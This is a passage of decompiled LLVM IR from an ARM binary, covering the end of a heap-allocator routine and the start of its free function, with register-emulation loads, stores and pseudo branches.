  %v1_170fc = phi i32 [ %v1_171ec, %dec_label_pc_171ec ], [ %v1_170e8, %dec_label_pc_170d0 ]
  %v1_170f0 = inttoptr i32 %v1_170fc to i32*
  %v2_170f0 = load i32, i32* %v1_170f0, align 4
  store i32 %v2_170f0, i32* %r1.global-to-local, align 4
  %v2_170f4 = icmp eq i32 %v2_170f0, 0
  br i1 %v2_170f4, label %dec_label_pc_171e4, label %dec_label_pc_170fc

dec_label_pc_170fc:                               ; preds = %dec_label_pc_170f0
  %v0_170fc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_170fc, i32* %v1_170f0, align 4
  %v0_17100.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17100

dec_label_pc_17100:                               ; preds = %dec_label_pc_171d8, %dec_label_pc_170fc
  %v0_1711c = phi i32 [ %v0_171d8, %dec_label_pc_171d8 ], [ %v0_17100.pre, %dec_label_pc_170fc ]
  %v1_17100 = add i32 %v0_1711c, 4
  %v2_17100 = inttoptr i32 %v1_17100 to i32*
  %v3_17100 = load i32, i32* %v2_17100, align 4
  store i32 %v3_17100, i32* %r3.global-to-local, align 4
  %v1_17104 = and i32 %v3_17100, -2
  store i32 %v1_17104, i32* %lr.global-to-local, align 4
  %v2_17108 = add i32 %v1_17104, %v0_1711c
  store i32 %v2_17108, i32* @r0, align 4
  %v1_1710c = urem i32 %v3_17100, 2
  %v2_1710c = icmp eq i32 %v1_1710c, 0
  %v1_17110 = add i32 %v0_1711c, 8
  %v2_17110 = inttoptr i32 %v1_17110 to i32*
  %v3_17110 = load i32, i32* %v2_17110, align 4
  store i32 %v3_17110, i32* %sl.global-to-local, align 4
  %v1_17114 = add i32 %v2_17108, 4
  %v2_17114 = inttoptr i32 %v1_17114 to i32*
  %v3_17114 = load i32, i32* %v2_17114, align 4
  store i32 %v3_17114, i32* %r8.global-to-local, align 4
  br i1 %v2_1710c, label %dec_label_pc_1711c, label %dec_label_pc_17150

dec_label_pc_1711c:                               ; preds = %dec_label_pc_17100
  %v1_1711c = inttoptr i32 %v0_1711c to i32*
  %v2_1711c = load i32, i32* %v1_1711c, align 4
  store i32 %v2_1711c, i32* %r5.global-to-local, align 4
  %v2_17120 = sub i32 %v0_1711c, %v2_1711c
  store i32 %v2_17120, i32* %r3.global-to-local, align 4
  %v1_17124 = add i32 %v2_17120, 8
  %v2_17124 = inttoptr i32 %v1_17124 to i32*
  %v3_17124 = load i32, i32* %v2_17124, align 4
  store i32 %v3_17124, i32* %ip.global-to-local, align 4
  %v1_17128 = add i32 %v3_17124, 12
  %v2_17128 = inttoptr i32 %v1_17128 to i32*
  %v3_17128 = load i32, i32* %v2_17128, align 4
  store i32 %v3_17128, i32* %r1.global-to-local, align 4
  %v9_1712c = icmp eq i32 %v3_17128, %v2_17120
  %v1_17130 = add i32 %v2_17120, 12
  %v2_17130 = inttoptr i32 %v1_17130 to i32*
  %v3_17130 = load i32, i32* %v2_17130, align 4
  store i32 %v3_17130, i32* %r2.global-to-local, align 4
  br i1 %v9_1712c, label %dec_label_pc_17138, label %dec_label_pc_17194

dec_label_pc_17138:                               ; preds = %dec_label_pc_1711c
  %v1_17138 = add i32 %v3_17130, 8
  %v2_17138 = inttoptr i32 %v1_17138 to i32*
  %v3_17138 = load i32, i32* %v2_17138, align 4
  store i32 %v3_17138, i32* %r3.global-to-local, align 4
  %v9_1713c = icmp eq i32 %v3_17138, %v2_17120
  br i1 %v9_1713c, label %dec_label_pc_17144, label %dec_label_pc_17194

dec_label_pc_17144:                               ; preds = %dec_label_pc_17138
  store i32 %v3_17124, i32* %v2_17138, align 4
  %v0_17148 = load i32, i32* %r2.global-to-local, align 4
  %v1_17148 = load i32, i32* %ip.global-to-local, align 4
  %v2_17148 = add i32 %v1_17148, 12
  %v3_17148 = inttoptr i32 %v2_17148 to i32*
  store i32 %v0_17148, i32* %v3_17148, align 4
  %v0_1714c = load i32, i32* %lr.global-to-local, align 4
  %v1_1714c = load i32, i32* %r5.global-to-local, align 4
  %v2_1714c = add i32 %v1_1714c, %v0_1714c
  store i32 %v2_1714c, i32* %lr.global-to-local, align 4
  %v0_17154.pre = load i32, i32* @r0, align 4
  %v0_17158.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17150

dec_label_pc_17150:                               ; preds = %dec_label_pc_17100, %dec_label_pc_17144
  %v0_171c8 = phi i32 [ %v1_17104, %dec_label_pc_17100 ], [ %v2_1714c, %dec_label_pc_17144 ]
  %v0_17158 = phi i32 [ %v3_17114, %dec_label_pc_17100 ], [ %v0_17158.pre, %dec_label_pc_17144 ]
  %v1_1716c = phi i32 [ %v2_17108, %dec_label_pc_17100 ], [ %v0_17154.pre, %dec_label_pc_17144 ]
  %v0_17150 = load i32, i32* @r4, align 4
  %v1_17150 = add i32 %v0_17150, 44
  %v2_17150 = inttoptr i32 %v1_17150 to i32*
  %v3_17150 = load i32, i32* %v2_17150, align 4
  store i32 %v3_17150, i32* %r3.global-to-local, align 4
  %v9_17154 = icmp eq i32 %v1_1716c, %v3_17150
  %v1_17158 = and i32 %v0_17158, -4
  store i32 %v1_17158, i32* %r5.global-to-local, align 4
  br i1 %v9_17154, label %dec_label_pc_171c8, label %dec_label_pc_17160

dec_label_pc_17160:                               ; preds = %dec_label_pc_17150
  %v2_17160 = add i32 %v1_1716c, %v1_17158
  store i32 %v2_17160, i32* %r3.global-to-local, align 4
  %v1_17164 = add i32 %v2_17160, 4
  %v2_17164 = inttoptr i32 %v1_17164 to i32*
  %v3_17164 = load i32, i32* %v2_17164, align 4
  store i32 %v3_17164, i32* %r3.global-to-local, align 4
  %v1_17168 = urem i32 %v3_17164, 2
  %v2_17168 = icmp eq i32 %v1_17168, 0
  %v2_1716c = add i32 %v1_1716c, 4
  %v3_1716c = inttoptr i32 %v2_1716c to i32*
  store i32 %v1_17158, i32* %v3_1716c, align 4
  br i1 %v2_17168, label %dec_label_pc_17174, label %dec_label_pc_17160.dec_label_pc_171a4_crit_edge

dec_label_pc_17160.dec_label_pc_171a4_crit_edge:  ; preds = %dec_label_pc_17160
  %v0_171a8.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_171a4

dec_label_pc_17174:                               ; preds = %dec_label_pc_17160
  %v0_17174 = load i32, i32* @r0, align 4
  %v1_17174 = add i32 %v0_17174, 8
  %v2_17174 = inttoptr i32 %v1_17174 to i32*
  %v3_17174 = load i32, i32* %v2_17174, align 4
  store i32 %v3_17174, i32* %ip.global-to-local, align 4
  %v1_17178 = add i32 %v3_17174, 12
  %v2_17178 = inttoptr i32 %v1_17178 to i32*
  %v3_17178 = load i32, i32* %v2_17178, align 4
  store i32 %v3_17178, i32* %r3.global-to-local, align 4
  %v9_1717c = icmp eq i32 %v3_17178, %v0_17174
  %v1_17180 = add i32 %v0_17174, 12
  %v2_17180 = inttoptr i32 %v1_17180 to i32*
  %v3_17180 = load i32, i32* %v2_17180, align 4
  store i32 %v3_17180, i32* %r2.global-to-local, align 4
  br i1 %v9_1717c, label %dec_label_pc_17188, label %dec_label_pc_17194

dec_label_pc_17188:                               ; preds = %dec_label_pc_17174
  %v1_17188 = add i32 %v3_17180, 8
  %v2_17188 = inttoptr i32 %v1_17188 to i32*
  %v3_17188 = load i32, i32* %v2_17188, align 4
  store i32 %v3_17188, i32* %r3.global-to-local, align 4
  %v9_1718c = icmp eq i32 %v3_17188, %v0_17174
  br i1 %v9_1718c, label %dec_label_pc_17198, label %dec_label_pc_17194

dec_label_pc_17194:                               ; preds = %dec_label_pc_17174, %dec_label_pc_17138, %dec_label_pc_1711c, %dec_label_pc_17188
  %v0_17194 = call i32 @abort()
  store i32 %v0_17194, i32* @r0, align 4
  %v0_17198.pre = load i32, i32* @ip, align 4
  %v1_17198.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_17198

dec_label_pc_17198:                               ; preds = %dec_label_pc_17188, %dec_label_pc_17194
  %v1_17198 = phi i32 [ %v3_17180, %dec_label_pc_17188 ], [ %v1_17198.pre, %dec_label_pc_17194 ]
  %v0_17198 = phi i32 [ %v3_17174, %dec_label_pc_17188 ], [ %v0_17198.pre, %dec_label_pc_17194 ]
  %v2_17198 = add i32 %v1_17198, 8
  %v3_17198 = inttoptr i32 %v2_17198 to i32*
  store i32 %v0_17198, i32* %v3_17198, align 4
  %v0_1719c = load i32, i32* %r2.global-to-local, align 4
  %v1_1719c = load i32, i32* %ip.global-to-local, align 4
  %v2_1719c = add i32 %v1_1719c, 12
  %v3_1719c = inttoptr i32 %v2_1719c to i32*
  store i32 %v0_1719c, i32* %v3_1719c, align 4
  %v0_171a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_171a0 = load i32, i32* %r5.global-to-local, align 4
  %v2_171a0 = add i32 %v1_171a0, %v0_171a0
  store i32 %v2_171a0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_171a4

dec_label_pc_171a4:                               ; preds = %dec_label_pc_17160.dec_label_pc_171a4_crit_edge, %dec_label_pc_17198
  %v0_171a8 = phi i32 [ %v0_171a8.pre, %dec_label_pc_17160.dec_label_pc_171a4_crit_edge ], [ %v2_171a0, %dec_label_pc_17198 ]
  %v0_171a4 = load i32, i32* %r7.global-to-local, align 4
  %v1_171a4 = add i32 %v0_171a4, 8
  %v2_171a4 = inttoptr i32 %v1_171a4 to i32*
  %v3_171a4 = load i32, i32* %v2_171a4, align 4
  store i32 %v3_171a4, i32* %r2.global-to-local, align 4
  %v1_171a8 = or i32 %v0_171a8, 1
  store i32 %v1_171a8, i32* %r3.global-to-local, align 4
  %v0_171ac = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_171ac, i32* %v2_171a4, align 4
  %v0_171b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_171b0 = load i32, i32* %r2.global-to-local, align 4
  %v2_171b0 = add i32 %v1_171b0, 12
  %v3_171b0 = inttoptr i32 %v2_171b0 to i32*
  store i32 %v0_171b0, i32* %v3_171b0, align 4
  %v0_171b4 = load i32, i32* %lr.global-to-local, align 4
  %v1_171b4 = load i32, i32* %r1.global-to-local, align 4
  %v3_171b4 = add i32 %v1_171b4, %v0_171b4
  %v4_171b4 = inttoptr i32 %v3_171b4 to i32*
  store i32 %v0_171b4, i32* %v4_171b4, align 4
  %v0_171b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_171b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_171b8 = add i32 %v1_171b8, 4
  %v3_171b8 = inttoptr i32 %v2_171b8 to i32*
  store i32 %v0_171b8, i32* %v3_171b8, align 4
  %v0_171bc = load i32, i32* %r2.global-to-local, align 4
  %v1_171bc = load i32, i32* %r1.global-to-local, align 4
  %v2_171bc = add i32 %v1_171bc, 8
  %v3_171bc = inttoptr i32 %v2_171bc to i32*
  store i32 %v0_171bc, i32* %v3_171bc, align 4
  %v0_171c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_171c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_171c0 = add i32 %v1_171c0, 12
  %v3_171c0 = inttoptr i32 %v2_171c0 to i32*
  store i32 %v0_171c0, i32* %v3_171c0, align 4
  br label %dec_label_pc_171d8

dec_label_pc_171c8:                               ; preds = %dec_label_pc_17150
  %v2_171c8 = add i32 %v1_17158, %v0_171c8
  %v1_171cc = or i32 %v2_171c8, 1
  store i32 %v1_171cc, i32* %r3.global-to-local, align 4
  %v1_171d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_171d0 = add i32 %v1_171d0, 4
  %v3_171d0 = inttoptr i32 %v2_171d0 to i32*
  store i32 %v1_171cc, i32* %v3_171d0, align 4
  %v0_171d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_171d4 = load i32, i32* @r4, align 4
  %v2_171d4 = add i32 %v1_171d4, 44
  %v3_171d4 = inttoptr i32 %v2_171d4 to i32*
  store i32 %v0_171d4, i32* %v3_171d4, align 4
  br label %dec_label_pc_171d8

dec_label_pc_171d8:                               ; preds = %dec_label_pc_171a4, %dec_label_pc_171c8
  %v0_171d8 = load i32, i32* %sl.global-to-local, align 4
  %v2_171d8 = icmp eq i32 %v0_171d8, 0
  store i32 %v0_171d8, i32* %r1.global-to-local, align 4
  br i1 %v2_171d8, label %dec_label_pc_171e4.loopexit, label %dec_label_pc_17100

dec_label_pc_171e4.loopexit:                      ; preds = %dec_label_pc_171d8
  %v0_171e4.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_171e4.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_171e4

dec_label_pc_171e4:                               ; preds = %dec_label_pc_171e4.loopexit, %dec_label_pc_170f0
  %v1_171e4 = phi i32 [ %v1_171e4.pre, %dec_label_pc_171e4.loopexit ], [ %v1_171e410, %dec_label_pc_170f0 ]
  %v0_171ec = phi i32 [ %v0_171e4.pre, %dec_label_pc_171e4.loopexit ], [ %v1_170fc, %dec_label_pc_170f0 ]
  %v9_171e4 = icmp eq i32 %v0_171ec, %v1_171e4
  br i1 %v9_171e4, label %dec_label_pc_1725c, label %dec_label_pc_171ec

dec_label_pc_171ec:                               ; preds = %dec_label_pc_171e4
  %v1_171ec = add i32 %v0_171ec, 4
  store i32 %v1_171ec, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_170f0

dec_label_pc_171f4.dec_label_pc_171f4_crit_edge:  ; preds = %dec_label_pc_171f4.preheader, %dec_label_pc_171f4.dec_label_pc_171f4_crit_edge
  %v0_171f4.pre = load i32, i32* @r4, align 4
  %v1_171f4.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_171f4 = mul i32 %v1_171f4.pre, 8
  %v5_171f4 = add i32 %v4_171f4, %v0_171f4.pre
  %v1_171f8 = add i32 %v1_171f4.pre, 1
  store i32 %v1_171f8, i32* %r2.global-to-local, align 4
  %v1_171fc = add i32 %v5_171f4, 44
  store i32 %v1_171fc, i32* %r3.global-to-local, align 4
  %v2_17204 = add i32 %v5_171f4, 52
  %v3_17204 = inttoptr i32 %v2_17204 to i32*
  store i32 %v1_171fc, i32* %v3_17204, align 4
  %v0_17208 = load i32, i32* %r3.global-to-local, align 4
  %v2_17208 = add i32 %v0_17208, 12
  %v3_17208 = inttoptr i32 %v2_17208 to i32*
  store i32 %v0_17208, i32* %v3_17208, align 4
  %v7_1720c = icmp sgt i32 %v1_171f8, 95
  br i1 %v7_1720c, label %dec_label_pc_17210, label %dec_label_pc_171f4.dec_label_pc_171f4_crit_edge

dec_label_pc_17210:                               ; preds = %dec_label_pc_171f4.dec_label_pc_171f4_crit_edge
  %v0_17210 = load i32, i32* @r4, align 4
  %v1_17210 = inttoptr i32 %v0_17210 to i32*
  %v2_17210 = load i32, i32* %v1_17210, align 4
  store i32 %v2_17210, i32* %r2.global-to-local, align 4
  %v1_17214 = add i32 %v0_17210, 864
  %v2_17214 = inttoptr i32 %v1_17214 to i32*
  %v3_17214 = load i32, i32* %v2_17214, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1721c = urem i32 %v2_17210, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_17224 = or i32 %v3_17214, 1
  store i32 %v1_17224, i32* %r1.global-to-local, align 4
  %v1_17228 = or i32 %v1_1721c, 72
  store i32 %v1_17228, i32* %r2.global-to-local, align 4
  %v1_1722c = add i32 %v0_17210, 52
  store i32 %v1_1722c, i32* %ip.global-to-local, align 4
  %v2_17230 = add i32 %v0_17210, 840
  %v3_17230 = inttoptr i32 %v2_17230 to i32*
  store i32 0, i32* %v3_17230, align 4
  %v0_17234 = load i32, i32* %r3.global-to-local, align 4
  %v1_17234 = add i32 %v0_17234, 65536
  store i32 %v1_17234, i32* %r3.global-to-local, align 4
  %v0_17238 = load i32, i32* %r0.global-to-local, align 4
  %v1_17238 = load i32, i32* @r4, align 4
  %v2_17238 = add i32 %v1_17238, 836
  %v3_17238 = inttoptr i32 %v2_17238 to i32*
  store i32 %v0_17238, i32* %v3_17238, align 4
  %v0_1723c = load i32, i32* %r0.global-to-local, align 4
  %v1_1723c = load i32, i32* @r4, align 4
  %v2_1723c = add i32 %v1_1723c, 844
  %v3_1723c = inttoptr i32 %v2_1723c to i32*
  store i32 %v0_1723c, i32* %v3_1723c, align 4
  %v1_17240 = load i32, i32* @r4, align 4
  %v2_17240 = add i32 %v1_17240, 852
  %v3_17240 = inttoptr i32 %v2_17240 to i32*
  store i32 %v1_17234, i32* %v3_17240, align 4
  %v1_17244 = load i32, i32* @r4, align 4
  %v2_17244 = add i32 %v1_17244, 864
  %v3_17244 = inttoptr i32 %v2_17244 to i32*
  store i32 %v1_17224, i32* %v3_17244, align 4
  %v1_17248 = load i32, i32* @r4, align 4
  %v2_17248 = inttoptr i32 %v1_17248 to i32*
  store i32 %v1_17228, i32* %v2_17248, align 4
  %v0_1724c = load i32, i32* %ip.global-to-local, align 4
  %v1_1724c = load i32, i32* @r4, align 4
  %v2_1724c = add i32 %v1_1724c, 44
  %v3_1724c = inttoptr i32 %v2_1724c to i32*
  store i32 %v0_1724c, i32* %v3_1724c, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_17254 = call i32 @sysconf(i32 30, i32 %v1_17224, i32 %v1_17228, i32 %v1_17234)
  store i32 %v4_17254, i32* @r0, align 4
  %v1_17258 = load i32, i32* @r4, align 4
  %v2_17258 = add i32 %v1_17258, 860
  %v3_17258 = inttoptr i32 %v2_17258 to i32*
  store i32 %v4_17254, i32* %v3_17258, align 4
  br label %dec_label_pc_1725c

dec_label_pc_1725c:                               ; preds = %dec_label_pc_171e4, %dec_label_pc_17210
  %v2_17260 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_17260, i32* @r4, align 4
  %v1_17264 = load i32, i32* @r0, align 4
  ret i32 %v1_17264

; uselistorder directives
  uselistorder i32 %v0_17210, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17208, { 1, 0 }
  uselistorder i32 %v1_171ec, { 1, 0 }
  uselistorder i32 %v0_171d8, { 0, 2, 1 }
  uselistorder i32 %v0_171b4, { 1, 0 }
  uselistorder i32 %v1_17104, { 1, 0, 2 }
  uselistorder i32 %v0_1711c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_170dc, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 30, { 0, 5, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_1725c, { 1, 0 }
  uselistorder label %dec_label_pc_171f4.dec_label_pc_171f4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_171d8, { 1, 0 }
  uselistorder label %dec_label_pc_171a4, { 1, 0 }
  uselistorder label %dec_label_pc_17198, { 1, 0 }
  uselistorder label %dec_label_pc_17194, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_17150, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_17268 = load i32, i32* @r4, align 4
  %v6_17268 = load i32, i32* @r5, align 4
  %v9_17268 = load i32, i32* @r6, align 4
  %v12_17268 = load i32, i32* @r7, align 4
  %v18_17268 = load i32, i32* @lr, align 4
  %v0_17270 = load i32, i32* @r0, align 4
  store i32 %v0_17270, i32* @r6, align 4
  %v2_17270 = icmp eq i32 %v0_17270, 0
  %v2_17274 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r7, align 4
  br i1 %v2_17270, label %dec_label_pc_1747c, label %dec_label_pc_17280

dec_label_pc_17280:                               ; preds = %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_17284 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 76) to i32*), align 4
  store i32 %v4_17284, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 %v4_17284, i32* %r2.global-to-local, align 4
  %v4_17290 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 40) to i32*), align 4
  store i32 %v4_17290, i32* %r1.global-to-local, align 4
  store i32 %v2_17274, i32* %r0.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v4_1729c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 80) to i32*), align 4
  store i32 %v4_1729c, i32* %ip.global-to-local, align 4
  store i32 94888, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1729c)
  %v0_172a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_172a8, i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_172b0 = load i32, i32* @r7, align 4
  %v2_172b0 = add i32 %v0_172b0, 20
  %v3_172b0 = inttoptr i32 %v2_172b0 to i32*
  %v4_172b0 = load i32, i32* %v3_172b0, align 4
  store i32 %v4_172b0, i32* %ip.global-to-local, align 4
  store i32 94908, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_172b0)
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_172c0 = load i32, i32* @r7, align 4
  %v2_172c0 = add i32 %v0_172c0, 36
  %v3_172c0 = inttoptr i32 %v2_172c0 to i32*
  %v4_172c0 = load i32, i32* %v3_172c0, align 4
  store i32 %v4_172c0, i32* @lr, align 4
  %v0_172c4 = load i32, i32* @r6, align 4
  %v1_172c4 = add i32 %v0_172c4, -4
  %v2_172c4 = inttoptr i32 %v1_172c4 to i32*
  %v3_172c4 = load i32, i32* %v2_172c4, align 4
  store i32 %v3_172c4, i32* %r2.global-to-local, align 4
  %v1_172c8 = inttoptr i32 %v4_172c0 to i32*
  %v2_172c8 = load i32, i32* %v1_172c8, align 4
  store i32 %v2_172c8, i32* %r3.global-to-local, align 4
  %v1_172cc = and i32 %v3_172c4, -4
  store i32 %v1_172cc, i32* %ip.global-to-local, align 4
  %v1_172d0 = add i32 %v0_172c4, -8
  store i32 %v1_172d0, i32* @r5, align 4
  store i32 %v1_172d0, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_172cc, %v2_172c8
  br i1 %tmp, label %dec_label_pc_17300, label %dec_label_pc_172e0

dec_label_pc_172e0:                               ; preds = %dec_label_pc_17280
  %v1_172e0 = or i32 %v2_172c8, 3
  store i32 %v1_172e0, i32* %r3.global-to-local, align 4
  store i32 %v1_172e0, i32* %v1_172c8, align 4
  %v3_172e4 = load i32, i32* @lr, align 4
  %v4_172e4 = add i32 %v3_172e4, -8
  store i32 %v4_172e4, i32* %lr.global-to-local, align 4
  %v0_172e8 = load i32, i32* %ip.global-to-local, align 4
  %v3_172e8 = udiv i32 %v0_172e8, 8
  store i32 %v3_172e8, i32* %r1.global-to-local, align 4
  %v1_172ec = add i32 %v3_172e4, -4
  store i32 %v1_172ec, i32* @r2, align 4
  %v4_172f0 = mul nuw i32 %v3_172e8, 4
  %v5_172f0 = add i32 %v4_172f0, %v1_172ec
  %v6_172f0 = inttoptr i32 %v5_172f0 to i32*
  %v7_172f0 = load i32, i32* %v6_172f0, align 4
  store i32 %v7_172f0, i32* %r3.global-to-local, align 4
  %v1_172f4 = load i32, i32* @r5, align 4
  %v2_172f4 = add i32 %v1_172f4, 8
  %v3_172f4 = inttoptr i32 %v2_172f4 to i32*
  store i32 %v7_172f0, i32* %v3_172f4, align 4
  %v0_172f8 = load i32, i32* @r5, align 4
  %v1_172f8 = load i32, i32* @r2, align 4
  %v2_172f8 = load i32, i32* %r1.global-to-local, align 4
  %v5_172f8 = mul i32 %v2_172f8, 4
  %v6_172f8 = add i32 %v5_172f8, %v1_172f8
  %v7_172f8 = inttoptr i32 %v6_172f8 to i32*
  store i32 %v0_172f8, i32* %v7_172f8, align 4
  br label %dec_label_pc_17464

dec_label_pc_17300:                               ; preds = %dec_label_pc_17280
  %v1_17300 = and i32 %v3_172c4, 2
  %v2_17300 = icmp eq i32 %v1_17300, 0
  br i1 %v2_17300, label %dec_label_pc_17308, label %dec_label_pc_1743c

dec_label_pc_17308:                               ; preds = %dec_label_pc_17300
  %v1_17308 = or i32 %v2_172c8, 1
  store i32 %v1_17308, i32* %r3.global-to-local, align 4
  store i32 %v1_17308, i32* %v1_172c8, align 4
  %v0_17310 = load i32, i32* @r6, align 4
  %v1_17310 = add i32 %v0_17310, -4
  %v2_17310 = inttoptr i32 %v1_17310 to i32*
  %v3_17310 = load i32, i32* %v2_17310, align 4
  store i32 %v3_17310, i32* %r3.global-to-local, align 4
  %v0_17314 = load i32, i32* @r5, align 4
  %v1_17314 = load i32, i32* %ip.global-to-local, align 4
  %v2_17314 = add i32 %v1_17314, %v0_17314
  store i32 %v2_17314, i32* %lr.global-to-local, align 4
  %v1_17318 = urem i32 %v3_17310, 2
  %v2_17318 = icmp eq i32 %v1_17318, 0
  %v1_1731c = add i32 %v2_17314, 4
  %v2_1731c = inttoptr i32 %v1_1731c to i32*
  %v3_1731c = load i32, i32* %v2_1731c, align 4
  store i32 %v3_1731c, i32* %r8.global-to-local, align 4
  br i1 %v2_17318, label %dec_label_pc_17324, label %dec_label_pc_17358

dec_label_pc_17324:                               ; preds = %dec_label_pc_17308
  %v1_17324 = add i32 %v0_17310, -8
  %v2_17324 = inttoptr i32 %v1_17324 to i32*
  %v3_17324 = load i32, i32* %v2_17324, align 4
  store i32 %v3_17324, i32* %r1.global-to-local, align 4
  %v2_17328 = sub i32 %v0_17314, %v3_17324
  store i32 %v2_17328, i32* %r3.global-to-local, align 4
  %v1_1732c = add i32 %v2_17328, 8
  %v2_1732c = inttoptr i32 %v1_1732c to i32*
  %v3_1732c = load i32, i32* %v2_1732c, align 4
  store i32 %v3_1732c, i32* %r2.global-to-local, align 4
  %v1_17330 = add i32 %v3_1732c, 12
  %v2_17330 = inttoptr i32 %v1_17330 to i32*
  %v3_17330 = load i32, i32* %v2_17330, align 4
  store i32 %v3_17330, i32* %r4.global-to-local, align 4
  %v9_17334 = icmp eq i32 %v3_17330, %v2_17328
  %v1_17338 = add i32 %v2_17328, 12
  %v2_17338 = inttoptr i32 %v1_17338 to i32*
  %v3_17338 = load i32, i32* %v2_17338, align 4
  store i32 %v3_17338, i32* %r0.global-to-local, align 4
  br i1 %v9_17334, label %dec_label_pc_17340, label %dec_label_pc_173a4

dec_label_pc_17340:                               ; preds = %dec_label_pc_17324
  %v1_17340 = add i32 %v3_17338, 8
  %v2_17340 = inttoptr i32 %v1_17340 to i32*
  %v3_17340 = load i32, i32* %v2_17340, align 4
  store i32 %v3_17340, i32* %r3.global-to-local, align 4
  %v9_17344 = icmp eq i32 %v3_17340, %v2_17328
  br i1 %v9_17344, label %dec_label_pc_1734c, label %dec_label_pc_173a4

dec_label_pc_1734c:                               ; preds = %dec_label_pc_17340
  store i32 %v3_1732c, i32* %v2_17340, align 4
  %v0_17350 = load i32, i32* %r0.global-to-local, align 4
  %v1_17350 = load i32, i32* %r2.global-to-local, align 4
  %v2_17350 = add i32 %v1_17350, 12
  %v3_17350 = inttoptr i32 %v2_17350 to i32*
  store i32 %v0_17350, i32* %v3_17350, align 4
  %v0_17354 = load i32, i32* %ip.global-to-local, align 4
  %v1_17354 = load i32, i32* %r1.global-to-local, align 4
  %v2_17354 = add i32 %v1_17354, %v0_17354
  store i32 %v2_17354, i32* %ip.global-to-local, align 4
  %v0_17364.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_17368.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17358

dec_label_pc_17358:                               ; preds = %dec_label_pc_17308, %dec_label_pc_1734c
  %v0_173e4 = phi i32 [ %v1_17314, %dec_label_pc_17308 ], [ %v2_17354, %dec_label_pc_1734c ]
  %v0_17368 = phi i32 [ %v3_1731c, %dec_label_pc_17308 ], [ %v0_17368.pre, %dec_label_pc_1734c ]
  %v1_1737c = phi i32 [ %v2_17314, %dec_label_pc_17308 ], [ %v0_17364.pre, %dec_label_pc_1734c ]
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_1735c = load i32, i32* @r7, align 4
  %v2_1735c = add i32 %v0_1735c, 36
  %v3_1735c = inttoptr i32 %v2_1735c to i32*
  %v4_1735c = load i32, i32* %v3_1735c, align 4
  store i32 %v4_1735c, i32* @r2, align 4
  %v1_17360 = add i32 %v4_1735c, 44
  %v2_17360 = inttoptr i32 %v1_17360 to i32*
  %v3_17360 = load i32, i32* %v2_17360, align 4
  store i32 %v3_17360, i32* %r3.global-to-local, align 4
  %v9_17364 = icmp eq i32 %v1_1737c, %v3_17360
  %v1_17368 = and i32 %v0_17368, -4
  store i32 %v1_17368, i32* %r0.global-to-local, align 4
  br i1 %v9_17364, label %dec_label_pc_173e4, label %dec_label_pc_17370

dec_label_pc_17370:                               ; preds = %dec_label_pc_17358
  %v2_17370 = add i32 %v1_1737c, %v1_17368
  store i32 %v2_17370, i32* %r3.global-to-local, align 4
  %v1_17374 = add i32 %v2_17370, 4
  %v2_17374 = inttoptr i32 %v1_17374 to i32*
